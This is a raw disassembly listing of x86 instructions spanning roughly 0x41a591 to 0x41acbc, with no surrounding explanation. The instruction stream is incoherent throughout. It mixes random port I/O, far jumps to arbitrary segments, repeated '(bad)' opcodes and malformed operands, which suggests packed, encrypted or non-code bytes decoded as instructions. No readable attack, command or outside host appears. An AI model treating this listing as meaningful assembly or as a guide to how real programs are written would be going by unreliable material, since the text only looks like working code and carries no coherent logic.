  41a591:	and    eax,edi
  41a593:	push   esp
  41a594:	into   
  41a595:	mov    bh,0xbf
  41a597:	xor    BYTE PTR [eax+ebx*2],ah
  41a59a:	pop    ss
  41a59b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a59c:	mov    dh,0xb1
  41a59e:	das    
  41a59f:	and    eax,0x51469a1d
  41a5a4:	cld    
  41a5a5:	sbb    al,0x72
  41a5a7:	xchg   BYTE PTR [eax-0x35dbc560],ah
  41a5ad:	scas   al,BYTE PTR es:[edi]
  41a5ae:	jne    0x41a5de
  41a5b0:	pop    esi
  41a5b1:	and    DWORD PTR [esi+0x237dd5da],esi
  41a5b7:	jns    0x41a5c2
  41a5b9:	ins    DWORD PTR es:[edi],dx
  41a5ba:	js     0x41a58a
  41a5bc:	fbstp  TBYTE PTR ds:0xf0a48998
  41a5c2:	or     bl,BYTE PTR [ebx]
  41a5c4:	inc    edi
  41a5c5:	fmul   st,st(2)
  41a5c7:	fsubr  st,st(6)
  41a5c9:	inc    edx
  41a5ca:	push   ecx
  41a5cb:	rcr    ebp,1
  41a5cd:	dec    edx
  41a5ce:	and    al,0xa8
  41a5d0:	out    0x49,eax
  41a5d2:	xchg   ebx,eax
  41a5d3:	mov    cl,0x52
  41a5d5:	repnz pop ebx
  41a5d7:	push   ds
  41a5d8:	lock mov dl,0x59
  41a5db:	rcr    DWORD PTR [ebp+eax*1-0x76],cl
  41a5df:	fidivr WORD PTR [ebp-0x37]
  41a5e2:	scas   al,BYTE PTR es:[edi]
  41a5e3:	sbb    ebp,DWORD PTR [ebp+0x71bb4e8b]
  41a5e9:	mov    esi,0xb21337c8
  41a5ee:	and    al,0xb3
  41a5f0:	xchg   ebx,eax
  41a5f1:	rcl    ebp,0x10
  41a5f4:	(bad)  
  41a5f6:	mov    ds:0x58dc96bf,al
  41a5fb:	sbb    dl,BYTE PTR [ebx+0x11bb13ef]
  41a601:	gs pop ds
  41a603:	adc    esp,ecx
  41a605:	ret    0x56e2
  41a608:	xchg   ecx,eax
  41a609:	test   ecx,0x9082779d
  41a60f:	add    eax,eax
  41a611:	sub    dh,al
  41a613:	pop    esi
  41a614:	pop    eax
  41a615:	jle    0x41a656
  41a617:	inc    esp
  41a618:	pop    ebx
  41a619:	add    dl,BYTE PTR [ebx]
  41a61b:	into   
  41a61c:	pop    ebp
  41a61d:	mov    ?,WORD PTR [edx+0x4b]
  41a620:	inc    edi
  41a621:	cmp    ebp,DWORD PTR [eax+ecx*4-0x28c146bd]
  41a628:	and    BYTE PTR [edx],bh
  41a62a:	fisub  WORD PTR [esp+eiz*2-0x2d7028a0]
  41a631:	dec    esi
  41a632:	out    0xf0,eax
  41a634:	mov    bl,0xf6
  41a636:	imul   edi,DWORD PTR [edx+0x53],0xc54e046c
  41a63d:	mov    ecx,DWORD PTR [esi]
  41a63f:	fisub  DWORD PTR [ebp+ecx*1+0x7]
  41a643:	mov    DWORD PTR [ecx],ebx
  41a645:	adc    al,0x8f
  41a647:	out    dx,al
  41a648:	rcl    esp,cl
  41a64a:	jbe    0x41a62b
  41a64c:	shr    ebx,1
  41a64e:	push   edi
  41a64f:	or     DWORD PTR [esp+esi*8],ebx
  41a652:	add    BYTE PTR [ecx+0x3a5f913b],bl
  41a658:	pop    ebp
  41a659:	inc    edi
  41a65a:	dec    ecx
  41a65b:	jnp    0x41a60e
  41a65d:	xchg   esi,eax
  41a65e:	fstp   DWORD PTR [edx+esi*1-0x28]
  41a662:	mov    al,0x96
  41a664:	imul   eax,DWORD PTR [ebx+0x1ee7b1f5],0xfffffffc
  41a66b:	in     al,0x56
  41a66d:	mov    ebx,0xa1187b32
  41a672:	fdivr  st(2),st
  41a674:	jne    0x41a6a2
  41a676:	sub    eax,0xb55a1ca3
  41a67b:	xor    al,0xe1
  41a67d:	cwde   
  41a67e:	aas    
  41a67f:	dec    edi
  41a680:	out    dx,eax
  41a681:	mov    DWORD PTR [ecx+ebx*1-0x125455a3],0xcf1ed7cf
  41a68c:	push   edx
  41a68d:	gs gs or al,0xde
  41a691:	pop    ecx
  41a692:	outs   dx,DWORD PTR ds:[esi]
  41a693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a694:	cmp    BYTE PTR [esi+0x79],bl
  41a697:	daa    
  41a698:	loopne 0x41a64f
  41a69a:	pusha  
  41a69b:	and    DWORD PTR [esi],eax
  41a69d:	inc    esi
  41a69e:	aad    0x4b
  41a6a0:	pop    ebx
  41a6a1:	xor    esi,DWORD PTR [eax+0x31bae357]
  41a6a7:	pop    ecx
  41a6a8:	adc    eax,0x7785205d
  41a6ad:	arpl   WORD PTR [edx+0x1c],ax
  41a6b0:	mov    esi,edx
  41a6b2:	dec    edx
  41a6b3:	stos   DWORD PTR es:[edi],eax
  41a6b4:	dec    ebp
  41a6b5:	or     DWORD PTR [edx],esi
  41a6b7:	mov    al,0xbc
  41a6b9:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6bb:	pop    es
  41a6bc:	(bad)  
  41a6be:	rol    DWORD PTR [edi-0x6c],0x6f
  41a6c2:	ficom  WORD PTR [edx+0x6f]
  41a6c5:	in     eax,dx
  41a6c6:	jae    0x41a6df
  41a6c8:	gs mov dl,0x10
  41a6cb:	push   cs
  41a6cc:	sub    BYTE PTR [ebx],dh
  41a6ce:	es inc ebx
  41a6d0:	mov    ah,0xc1
  41a6d2:	ret    0x6273
  41a6d5:	mov    dl,0xe5
  41a6d7:	call   0xf5823568
  41a6dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6dd:	cli    
  41a6de:	mov    WORD PTR [esi],?
  41a6e0:	into   
  41a6e1:	xor    DWORD PTR [esp+edi*8-0x7a],0x61
  41a6e6:	pop    edi
  41a6e7:	stos   BYTE PTR es:[edi],al
  41a6e8:	loopne 0x41a71b
  41a6ea:	enter  0xcba2,0xcb
  41a6ee:	js     0x41a754
  41a6f0:	stos   DWORD PTR es:[edi],eax
  41a6f1:	push   ds
  41a6f2:	add    cl,BYTE PTR [edx+0x63]
  41a6f5:	mov    edx,0x7ffc181a
  41a6fa:	stc    
  41a6fb:	dec    DWORD PTR [ecx-0x5f]
  41a6fe:	xor    DWORD PTR [ebx-0xd],0xffffffbc
  41a702:	iret   
  41a703:	pop    eax
  41a704:	adc    al,0x3b
  41a706:	out    dx,eax
  41a707:	dec    BYTE PTR [eax-0x26ad8a46]
  41a70d:	in     al,dx
  41a70e:	pusha  
  41a70f:	dec    edi
  41a710:	jl     0x41a6e6
  41a712:	dec    edi
  41a713:	jo     0x41a72d
  41a715:	shr    DWORD PTR [eax+0x5c],cl
  41a718:	scas   eax,DWORD PTR es:[edi]
  41a719:	outs   dx,DWORD PTR ds:[esi]
  41a71a:	icebp  
  41a71b:	sbb    edx,DWORD PTR [ecx-0x243f00e2]
  41a721:	mov    bh,0x3e
  41a723:	sbb    al,BYTE PTR [eax+0x33]
  41a726:	fisttp QWORD PTR [ecx-0x78]
  41a729:	lods   al,BYTE PTR ds:[esi]
  41a72a:	adc    al,0x4
  41a72c:	mov    edi,0x8c6b8f12
  41a731:	or     eax,0x3b4c68ff
  41a736:	pop    ebp
  41a737:	(bad)  
  41a738:	push   ebp
  41a739:	in     eax,0x5b
  41a73b:	in     eax,0xdf
  41a73d:	leave  
  41a73e:	sub    eax,0x530d043c
  41a743:	and    ebp,DWORD PTR ds:0xd7e8ffe4
  41a749:	dec    esp
  41a74a:	jb     0x41a7bf
  41a74c:	add    BYTE PTR [ebp+0x5b309da6],dl
  41a752:	jg     0x41a7a8
  41a754:	xor    BYTE PTR [edi+0x7e028255],0xcf
  41a75b:	sub    cl,BYTE PTR [ecx]
  41a75d:	pop    esi
  41a75e:	jns    0x41a7b2
  41a760:	out    0xd7,eax
  41a762:	ret    0xed0c
  41a765:	add    esp,eax
  41a767:	mov    edi,0x40e98d31
  41a76c:	ror    esp,cl
  41a76e:	jl     0x41a7c8
  41a770:	mov    edx,0x96d7dea
  41a775:	lods   al,BYTE PTR ds:[esi]
  41a776:	add    ebp,ebp
  41a778:	mov    al,0xb7
  41a77a:	arpl   WORD PTR ds:0x72538cd2,si
  41a780:	jge    0x41a76c
  41a782:	push   edx
  41a783:	sar    bh,1
  41a785:	lock mov bl,0x88
  41a788:	out    dx,eax
  41a789:	jns    0x41a7b0
  41a78b:	cli    
  41a78c:	mov    cl,0x9a
  41a78e:	xchg   esp,eax
  41a78f:	xlat   BYTE PTR ds:[ebx]
  41a790:	sbb    dh,BYTE PTR [ebx+0x59]
  41a793:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a794:	stos   BYTE PTR es:[edi],al
  41a795:	sahf   
  41a796:	xor    BYTE PTR [ecx],dh
  41a798:	enter  0x45c1,0xba
  41a79c:	dec    ebp
  41a79d:	xor    dl,BYTE PTR [di]
  41a7a0:	mov    eax,ds:0x491b8e07
  41a7a5:	dec    ebx
  41a7a6:	xchg   esi,eax
  41a7a7:	add    ah,cl
  41a7a9:	adc    ch,BYTE PTR [ecx-0xa]
  41a7ac:	fdiv   QWORD PTR [eiz*2-0x43d34c8d]
  41a7b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7b4:	stos   BYTE PTR es:[edi],al
  41a7b5:	(bad)  
  41a7b6:	ret    0xa835
  41a7b9:	dec    ebp
  41a7ba:	xchg   DWORD PTR [ecx-0x7f844b55],eax
  41a7c0:	xlat   BYTE PTR ds:[ebx]
  41a7c1:	retf   
  41a7c2:	or     BYTE PTR [ebp-0x47367f56],ch
  41a7c8:	cmp    eax,0x80ecddfc
  41a7cd:	es stos DWORD PTR es:[edi],eax
  41a7cf:	leave  
  41a7d0:	aad    0x20
  41a7d2:	xchg   edx,eax
  41a7d3:	lahf   
  41a7d4:	xchg   DWORD PTR [edi],esp
  41a7d6:	les    edi,FWORD PTR [ebx-0x49]
  41a7d9:	leave  
  41a7da:	fcomp  st(2)
  41a7dc:	scas   eax,DWORD PTR es:[edi]
  41a7dd:	mov    bh,0xbe
  41a7df:	scas   eax,DWORD PTR es:[edi]
  41a7e0:	and    DWORD PTR [edi],ebp
  41a7e2:	pusha  
  41a7e3:	dec    ebp
  41a7e4:	jmp    0x70c2:0x5a6e6f18
  41a7eb:	or     ebp,eax
  41a7ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7ee:	lods   al,BYTE PTR ds:[esi]
  41a7ef:	inc    esi
  41a7f0:	aad    0x4b
  41a7f2:	ret    0x3851
  41a7f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7f6:	jb     0x41a83e
  41a7f8:	adc    eax,0x5b689341
  41a7fd:	add    BYTE PTR [ecx-0x49],0xce
  41a801:	cs hlt 
  41a803:	daa    
  41a804:	dec    ecx
  41a805:	dec    edx
  41a806:	sub    DWORD PTR ds:0x1b0152f9,esp
  41a80c:	pushf  
  41a80d:	mov    ds:0x7cc22198,eax
  41a812:	mov    cl,0xe4
  41a814:	enter  0x1d79,0xf5
  41a818:	mov    cl,0x48
  41a81a:	mov    WORD PTR [ecx+0x23],es
  41a81d:	pop    ds
  41a81e:	lods   al,BYTE PTR ds:[esi]
  41a81f:	sub    BYTE PTR [ecx-0x460a7a98],ah
  41a825:	or     ch,BYTE PTR [ebx]
  41a827:	mov    cl,BYTE PTR [edi*8+0x6144cb56]
  41a82e:	inc    edi
  41a82f:	ja     0x41a880
  41a831:	fmulp  st(0),st
  41a833:	jl     0x41a800
  41a835:	push   ds
  41a836:	(bad)
  41a839:	xor    eax,0xa2a5e62a
  41a83e:	sbb    eax,0x61c42547
  41a843:	or     DWORD PTR [edi],eax
  41a845:	pop    ebp
  41a846:	sbb    DWORD PTR [edi+edi*8+0x607dcbb5],ebx
  41a84d:	pop    edx
  41a84e:	ret    0x70c8
  41a851:	jmp    0xabad576e
  41a856:	call   0x60b4281e
  41a85b:	and    ah,BYTE PTR [eax+0x56]
  41a85e:	dec    esp
  41a85f:	repz (bad) 
  41a862:	lahf   
  41a863:	imul   edi,ebp,0xa6680d28
  41a869:	xor    eax,DWORD PTR [edx]
  41a86b:	outs   dx,DWORD PTR ds:[esi]
  41a86c:	rcr    BYTE PTR [ecx+ebp*1-0x7877cd6d],cl
  41a873:	fild   QWORD PTR [eax+0x538eda2e]
  41a879:	stos   BYTE PTR es:[edi],al
  41a87a:	ds mov edi,ecx
  41a87d:	cmp    eax,0x3f5b6c60
  41a882:	loopne 0x41a89b
  41a884:	enter  0xf826,0xd7
  41a888:	push   ebp
  41a889:	ss push ss
  41a88b:	mov    ebx,0xb27aa436
  41a890:	pop    eax
  41a891:	cmp    eax,0xc178e5e3
  41a896:	pop    esp
  41a897:	test   ch,dh
  41a899:	iret   
  41a89a:	loopne 0x41a8dd
  41a89c:	out    dx,eax
  41a89d:	mov    ebx,0x20441962
  41a8a2:	jnp    0x41a8c1
  41a8a4:	push   0x6e
  41a8a6:	not    BYTE PTR [eax-0x1d3cec38]
  41a8ac:	call   0x59b0b06a
  41a8b1:	in     al,0x46
  41a8b3:	lods   eax,DWORD PTR ds:[esi]
  41a8b4:	push   ds
  41a8b5:	iret   
  41a8b6:	xor    DWORD PTR [ecx+eiz*2],0xffffff8d
  41a8ba:	fistp  DWORD PTR [ebp+0x69005e6c]
  41a8c0:	cli    
  41a8c1:	out    0xf7,al
  41a8c3:	push   0xffffffb3
  41a8c5:	stc    
  41a8c6:	icebp  
  41a8c7:	hlt    
  41a8c8:	stos   BYTE PTR es:[edi],al
  41a8c9:	test   DWORD PTR [eax],edi
  41a8cb:	dec    edi
  41a8cc:	mov    cl,0x5
  41a8ce:	xchg   ebp,eax
  41a8cf:	xor    BYTE PTR [ebx+ebp*1-0x262a524c],dh
  41a8d6:	dec    ecx
  41a8d7:	pop    ecx
  41a8d8:	arpl   si,ax
  41a8da:	jnp    0x41a92c
  41a8dc:	pop    ecx
  41a8dd:	outs   dx,BYTE PTR ds:[esi]
  41a8de:	stos   DWORD PTR es:[edi],eax
  41a8df:	add    esp,eax
  41a8e1:	or     DWORD PTR [ecx],eax
  41a8e3:	je     0x41a8a2
  41a8e5:	fadd   QWORD PTR [ebx+0x624c83b9]
  41a8eb:	loope  0x41a953
  41a8ed:	out    dx,eax
  41a8ee:	jno    0x41a958
  41a8f0:	je     0x41a896
  41a8f2:	push   edx
  41a8f3:	pop    edi
  41a8f4:	outs   dx,DWORD PTR ds:[esi]
  41a8f5:	and    al,0x8e
  41a8f7:	cmp    al,0x62
  41a8f9:	add    dl,BYTE PTR [edi]
  41a8fb:	pop    es
  41a8fc:	cmp    BYTE PTR [edx+edx*4-0x7a344f4b],ch
  41a903:	mov    WORD PTR [edi+0x15f167ec],ss
  41a909:	push   ecx
  41a90a:	rcr    DWORD PTR [edx+0x40],0xe5
  41a90e:	pop    ss
  41a90f:	mov    al,0xf8
  41a911:	xor    ebp,esi
  41a913:	cmc    
  41a914:	fst    QWORD PTR [ecx]
  41a916:	add    eax,0xa1c47795
  41a91b:	jb     0x41a908
  41a91d:	add    esi,DWORD PTR [edi]
  41a91f:	jns    0x41a916
  41a921:	cli    
  41a922:	test   DWORD PTR [eax-0x3b],0x61221285
  41a929:	xchg   esp,eax
  41a92a:	add    DWORD PTR [ebp-0x51],0x3ae49244
  41a931:	mov    eax,ds:0xcd47aae7
  41a936:	add    BYTE PTR [ecx],bl
  41a938:	dec    eax
  41a939:	gs popf 
  41a93b:	adc    DWORD PTR [edi+0x59],ebx
  41a93e:	push   ecx
  41a93f:	and    edi,DWORD PTR [ebp+ebp*1+0x72af8f52]
  41a946:	mov    DWORD PTR [ecx+0x36],esi
  41a949:	dec    edx
  41a94a:	or     BYTE PTR ds:0x922cc27d,cl
  41a950:	nop
  41a951:	pop    esp
  41a952:	cmp    BYTE PTR [ebx+0x2ad01627],0x1b
  41a959:	mov    ebx,0x9ffec7ce
  41a95e:	or     dh,ch
  41a960:	loop   0x41a974
  41a962:	and    BYTE PTR [edx+0x20f783b8],dl
  41a968:	dec    edi
  41a969:	mov    ds:0x31f81803,eax
  41a96e:	mov    al,0x43
  41a970:	outs   dx,DWORD PTR ds:[esi]
  41a971:	in     al,0x20
  41a973:	mov    bh,0x6c
  41a975:	or     al,0xd2
  41a977:	dec    eax
  41a978:	std    
  41a979:	(bad)  
  41a97a:	mov    eax,0x12d9f277
  41a97f:	jmp    0x52194189
  41a984:	jle    0x41a99f
  41a986:	test   DWORD PTR [esi-0x67a5ae29],eax
  41a98c:	push   0x1ad47a5a
  41a991:	(bad)  
  41a992:	cwde   
  41a993:	push   ebx
  41a994:	lahf   
  41a995:	jge    0x41a943
  41a997:	xchg   esi,eax
  41a998:	jp     0x41a9b3
  41a99a:	outs   dx,BYTE PTR ds:[esi]
  41a99b:	ss pop edx
  41a99d:	and    al,0xb3
  41a99f:	xchg   edi,eax
  41a9a0:	outs   dx,DWORD PTR ds:[esi]
  41a9a1:	repnz imul edx,DWORD PTR [ecx],0x6a675416
  41a9a8:	nop
  41a9a9:	frstor [eax-0x23]
  41a9ac:	test   DWORD PTR [edx+0x15444d8a],edi
  41a9b2:	hlt    
  41a9b3:	(bad)  [ecx-0x74]
  41a9b6:	sbb    dh,BYTE PTR [eax+0x6b]
  41a9b9:	jl     0x41a996
  41a9bb:	adc    dh,ah
  41a9bd:	lahf   
  41a9be:	dec    eax
  41a9bf:	adc    edx,DWORD PTR [edx-0x3c2378af]
  41a9c5:	mov    ebp,0x202c1780
  41a9ca:	jb     0x41a99a
  41a9cc:	int3   
  41a9cd:	xor    BYTE PTR [ebx-0x64d253b1],bl
  41a9d3:	add    al,0xd
  41a9d5:	mov    al,ds:0xf33735c6
  41a9da:	adc    eax,edi
  41a9dc:	sbb    BYTE PTR [edx],ah
  41a9de:	out    dx,eax
  41a9df:	adc    DWORD PTR [esp+eax*8-0x4e],edi
  41a9e3:	push   ebx
  41a9e4:	mov    cl,BYTE PTR ds:0x1e7b8980
  41a9ea:	loop   0x41a999
  41a9ec:	sbb    ah,ah
  41a9ee:	inc    edi
  41a9ef:	rcr    DWORD PTR [esi-0x421d5e18],1
  41a9f5:	add    bh,BYTE PTR [ebx+0x7a73f45e]
  41a9fb:	add    ch,BYTE PTR [edx+0x407d7744]
  41aa01:	mov    esi,0xd97ac150
  41aa06:	lds    ecx,FWORD PTR [esi+0x4096b65a]
  41aa0c:	xlat   BYTE PTR ds:[ebx]
  41aa0d:	mov    bh,0x87
  41aa0f:	and    al,0xbe
  41aa11:	sti    
  41aa12:	sbb    cl,BYTE PTR [esi]
  41aa14:	test   BYTE PTR [ecx+ebp*2-0x4c1428b7],0xfa
  41aa1c:	jne    0x41aa02
  41aa1e:	aas    
  41aa1f:	lock shl DWORD PTR [edx],1
  41aa22:	les    edi,FWORD PTR [eax+0x3d]
  41aa25:	stc    
  41aa26:	lods   eax,DWORD PTR ds:[esi]
  41aa27:	sbb    BYTE PTR [esp+eax*2],dl
  41aa2a:	ins    BYTE PTR es:[edi],dx
  41aa2b:	lahf   
  41aa2c:	dec    esp
  41aa2d:	lahf   
  41aa2e:	lods   eax,DWORD PTR ds:[esi]
  41aa2f:	or     eax,0xef2b58a7
  41aa34:	std    
  41aa35:	mov    ebx,DWORD PTR [esi-0x5fb411f1]
  41aa3b:	fnstsw WORD PTR ds:0x74b3f8b4
  41aa41:	in     eax,dx
  41aa42:	inc    ecx
  41aa43:	xor    eax,0x75ff4c2a
  41aa48:	push   edi
  41aa49:	mov    edx,0x67de77a9
  41aa4e:	jmp    0x41aaca
  41aa50:	adc    al,0x1f
  41aa52:	js     0x41a9d8
  41aa54:	fisttp QWORD PTR [ebx-0x2aff6608]
  41aa5a:	pop    esp
  41aa5b:	push   esi
  41aa5c:	fwait
  41aa5d:	and    al,0xa9
  41aa5f:	outs   dx,DWORD PTR ds:[esi]
  41aa60:	fucompp 
  41aa62:	daa    
  41aa63:	sub    eax,0x3cfdb574
  41aa68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa69:	push   eax
  41aa6a:	adc    DWORD PTR [ebx],esp
  41aa6c:	adc    al,0x2e
  41aa6e:	adc    edi,esp
  41aa70:	pop    ds
  41aa71:	pusha  
  41aa72:	cld    
  41aa73:	dec    ebx
  41aa74:	pop    esp
  41aa75:	shr    DWORD PTR [esp+edi*4-0x6d96048],1
  41aa7c:	pop    es
  41aa7d:	lock add ch,al
  41aa80:	inc    edi
  41aa81:	adc    cl,BYTE PTR [eiz*4+0x59e8aa7d]
  41aa88:	popa   
  41aa89:	int    0x90
  41aa8b:	xor    al,0x6c
  41aa8d:	inc    ecx
  41aa8e:	(bad)  
  41aa8f:	(bad)  
  41aa90:	sbb    al,0x2f
  41aa92:	popa   
  41aa93:	or     bh,dh
  41aa95:	xchg   edi,eax
  41aa96:	sub    eax,0x147a83cb
  41aa9b:	pop    edi
  41aa9c:	or     eax,0x7981422f
  41aaa1:	iret   
  41aaa2:	jae    0x41aaf7
  41aaa4:	hlt    
  41aaa5:	xor    al,0xe5
  41aaa7:	(bad)  
  41aaa8:	js     0x41aaeb
  41aaaa:	xor    BYTE PTR [edx+0x65fffd32],dl
  41aab0:	mov    WORD PTR [ebx+0x3a],gs
  41aab3:	fcomp  DWORD PTR [ecx]
  41aab5:	retf   
  41aab6:	and    eax,0x7453625d
  41aabb:	clc    
  41aabc:	pop    edi
  41aabd:	int    0xb1
  41aabf:	mov    es,WORD PTR [eax-0x7f]
  41aac2:	adc    edx,DWORD PTR [eax+0x3ac43153]
  41aac8:	out    dx,eax
  41aac9:	mov    bh,0xb1
  41aacb:	sub    al,0xc9
  41aacd:	(bad)  
  41aacf:	cmp    DWORD PTR [edi-0x694d5bd8],0x2afae9c6
  41aad9:	adc    bl,BYTE PTR [edx+0x54d49537]
  41aadf:	imul   eax,DWORD PTR [edx+0x10c7bc6c],0x19
  41aae6:	add    dl,BYTE PTR [edx-0x21]
  41aae9:	sbb    BYTE PTR [ecx-0x2d28a882],bh
  41aaef:	lea    ebp,[ebx]
  41aaf1:	lds    esi,FWORD PTR [eax-0x71ab01b3]
  41aaf7:	pop    esi
  41aaf8:	cmp    BYTE PTR [esp+edi*2+0x20],ah
  41aafc:	das    
  41aafd:	inc    cx
  41aaff:	mov    cl,0x6a
  41ab01:	xchg   edx,eax
  41ab02:	imul   DWORD PTR [eax+0x3184b972]
  41ab08:	jae    0x41aae7
  41ab0a:	pop    ebx
  41ab0b:	daa    
  41ab0c:	mov    ecx,0xd36c0540
  41ab11:	gs mov ebx,0xbe7af3f1
  41ab17:	jp     0x41ab71
  41ab19:	popa   
  41ab1a:	mov    ah,0xb7
  41ab1c:	sti    
  41ab1d:	pop    esp
  41ab1e:	mov    al,ds:0xbfa1891c
  41ab23:	out    0x48,al
  41ab25:	dec    ebx
  41ab26:	lods   eax,DWORD PTR ds:[esi]
  41ab27:	fsub   QWORD PTR [ecx-0x7f]
  41ab2a:	xchg   ebx,eax
  41ab2b:	jne    0x41aac1
  41ab2d:	cdq    
  41ab2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab2f:	sti    
  41ab30:	inc    ecx
  41ab31:	dec    esi
  41ab32:	jae    0x41aab8
  41ab34:	pop    ebp
  41ab35:	call   0xead83faf
  41ab3a:	adc    cl,dh
  41ab3c:	mov    eax,0xe2123f15
  41ab41:	cli    
  41ab42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab43:	and    DWORD PTR [edi],ebx
  41ab45:	xor    al,0x48
  41ab47:	pop    edx
  41ab48:	jle    0x41ab4c
  41ab4a:	mov    dh,0x8c
  41ab4c:	xchg   edi,eax
  41ab4d:	push   ebp
  41ab4e:	hlt    
  41ab4f:	arpl   WORD PTR [esi-0x61cb4903],sp
  41ab55:	dec    ebp
  41ab56:	lock inc ecx
  41ab58:	push   es
  41ab59:	pop    es
  41ab5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab5b:	xor    edi,DWORD PTR [ecx-0x63]
  41ab5e:	sbb    eax,0xe6acd061
  41ab63:	mov    esi,edx
  41ab65:	and    ah,BYTE PTR [esi-0x7bc22b5b]
  41ab6b:	clc    
  41ab6c:	cs or  al,0x1f
  41ab6f:	mov    ch,BYTE PTR cs:[edi-0x1f]
  41ab73:	cmp    al,BYTE PTR [esi+0x19]
  41ab76:	inc    esp
  41ab77:	fild   DWORD PTR ds:0xb901d569
  41ab7d:	or     eax,0x2942d34
  41ab82:	ds jno 0x41abd5
  41ab85:	sub    eax,DWORD PTR [edx+0x44c9fc5d]
  41ab8b:	daa    
  41ab8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab8d:	ficomp DWORD PTR [ebp-0x2a]
  41ab90:	ins    BYTE PTR es:[edi],dx
  41ab91:	mov    al,0xaf
  41ab93:	pop    edi
  41ab94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab95:	mov    bh,0xf6
  41ab97:	popa   
  41ab98:	xor    esp,ebx
  41ab9a:	push   cs
  41ab9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab9c:	cld    
  41ab9d:	push   ds
  41ab9e:	mov    DWORD PTR [edi+0x10],edi
  41aba1:	ret    0x89f8
  41aba4:	das    
  41aba5:	pushf  
  41aba6:	jo     0x41ab5f
  41aba8:	sar    eax,0x62
  41abab:	popf   
  41abac:	fld    QWORD PTR [eax]
  41abae:	push   ebx
  41abaf:	gs mov bh,0x8
  41abb2:	pop    ecx
  41abb3:	call   0xbba4:0xa02ac159
  41abba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abbb:	nop
  41abbc:	bound  ebp,QWORD PTR [ebp-0x4d]
  41abbf:	lods   al,BYTE PTR ds:[esi]
  41abc0:	sub    DWORD PTR [ebp+0x2e217e8c],ecx
  41abc6:	call   0x336f:0x805cb4c2
  41abcd:	mov    ebp,0xb2294e02
  41abd2:	inc    esp
  41abd3:	dec    ebp
  41abd4:	adc    DWORD PTR [edi],0xaac8282c
  41abda:	scas   al,BYTE PTR es:[edi]
  41abdb:	lahf   
  41abdc:	ins    DWORD PTR es:[edi],dx
  41abdd:	xchg   BYTE PTR [edx+eiz*8-0x746c8716],cl
  41abe4:	jne    0x41ab9d
  41abe6:	jl     0x41ac1a
  41abe8:	mov    dl,0x83
  41abea:	xor    DWORD PTR [esi-0xb],0xffffffb1
  41abee:	pop    ebx
  41abef:	loopne 0x41abb9
  41abf1:	fwait
  41abf2:	and    al,0xe1
  41abf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abf5:	jmp    0x62f7:0x34890d36
  41abfc:	jo     0x41ac68
  41abfe:	bound  edx,QWORD PTR [ebp-0x51e1bb7]
  41ac04:	sbb    eax,0x33bce6ce
  41ac09:	hlt    
  41ac0a:	add    al,0x1
  41ac0c:	in     al,0x2c
  41ac0e:	fcomp  DWORD PTR [ebx+0x4a6f0e15]
  41ac14:	push   ss
  41ac15:	mov    ch,BYTE PTR [edi+eax*1+0x23]
  41ac19:	stos   DWORD PTR es:[edi],eax
  41ac1a:	imul   ecx,DWORD PTR [esi],0xf7d200ec
  41ac20:	pop    ebx
  41ac21:	jns    0x41ac2f
  41ac23:	pop    ss
  41ac24:	add    DWORD PTR [ecx],esi
  41ac26:	je     0x41abce
  41ac28:	mov    esi,0xa938ce5c
  41ac2d:	pop    edx
  41ac2e:	xor    cl,bl
  41ac30:	pop    edi
  41ac31:	nop
  41ac32:	test   al,0xdd
  41ac34:	fld    DWORD PTR [esi]
  41ac36:	retf   0xafbd
  41ac39:	jno    0x41ac2f
  41ac3b:	pop    eax
  41ac3c:	div    DWORD PTR [esi-0x11]
  41ac3f:	cmc    
  41ac40:	xor    al,0xe1
  41ac42:	loopne 0x41abe4
  41ac44:	sbb    BYTE PTR [ebx+0x4a364e2d],cl
  41ac4a:	mov    ecx,0x6f32fc89
  41ac4f:	daa    
  41ac50:	ret    
  41ac51:	icebp  
  41ac52:	aam    0x1a
  41ac54:	push   ecx
  41ac55:	mov    ds:0x1a822e00,al
  41ac5a:	aad    0x78
  41ac5c:	enter  0x5743,0x8
  41ac60:	push   0x39
  41ac62:	aaa    
  41ac63:	fisub  WORD PTR [edi+0x5a]
  41ac66:	(bad)  
  41ac67:	jle    0x41abff
  41ac69:	jno    0x41aca0
  41ac6b:	retf   0xf787
  41ac6e:	xor    eax,0x56257d38
  41ac73:	mov    ebp,0x17ed4262
  41ac78:	cmp    cl,BYTE PTR [edx-0x69]
  41ac7b:	or     bl,ah
  41ac7d:	test   DWORD PTR [ecx+eax*1+0x75],0x48b82cff
  41ac85:	add    esi,DWORD PTR [eax-0x1e]
  41ac88:	das    
  41ac89:	sbb    BYTE PTR [ebx-0x5e],ch
  41ac8c:	add    bl,BYTE PTR [ebp-0x2e8fd38c]
  41ac92:	fsubr  DWORD PTR [ebp+0x12]
  41ac95:	(bad)  
  41ac96:	dec    ebp
  41ac97:	mov    ds:0x2b8b8c43,eax
  41ac9c:	xor    al,0xe9
  41ac9e:	and    al,0x65
  41aca0:	jb     0x41ac94
  41aca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aca3:	and    edi,DWORD PTR [ebx+0x15]
  41aca6:	scas   al,BYTE PTR es:[edi]
  41aca7:	inc    eax
  41aca8:	cli    
  41aca9:	imul   esi,DWORD PTR [edi+0x5cb498f3],0x92f5f846
  41acb3:	xchg   ebx,eax
  41acb4:	sti    
  41acb5:	dec    ecx
  41acb6:	sub    ch,BYTE PTR [ecx]
  41acb8:	ins    DWORD PTR es:[edi],dx
  41acb9:	jle    0x41acbd
  41acbb:	popa   
  41acbc:	and    edx,DWORD PTR [ecx]
